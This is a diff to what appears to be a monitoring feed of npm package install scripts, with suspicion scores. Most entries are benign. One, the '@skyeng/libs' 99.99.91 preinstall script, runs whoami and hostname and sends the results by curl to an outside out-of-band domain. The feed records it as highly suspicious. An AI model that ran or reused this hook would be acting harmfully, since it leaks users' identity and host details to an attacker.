@@ -1,5 +1,35 @@
 [
   {
+    "packageName": "jav-manager",
+    "version": "0.1.2",
+    "scriptType": "postinstall",
+    "scriptContent": "node scripts/postinstall.js",
+    "previousVersion": "0.1.1",
+    "timestamp": "2026-02-08T10:36:58.090Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "@skyeng/libs",
+    "version": "99.99.91",
+    "scriptType": "preinstall",
+    "scriptContent": "u=$(whoami); h=$(hostname); curl http://trmskyeng.$u.$h.oob.w0lf.pw",
+    "previousVersion": "99.99.10",
+    "timestamp": "2026-02-08T10:36:40.264Z",
+    "issuesend": false,
+    "suspicionScore": 10
+  },
+  {
+    "packageName": "epson-connect-ts",
+    "version": "0.1.0",
+    "scriptType": "prebuild",
+    "scriptContent": "npm run clean",
+    "previousVersion": null,
+    "timestamp": "2026-02-08T10:36:38.392Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
     "packageName": "worktree-flow",
     "version": "0.0.3",
     "scriptType": "postbuild",
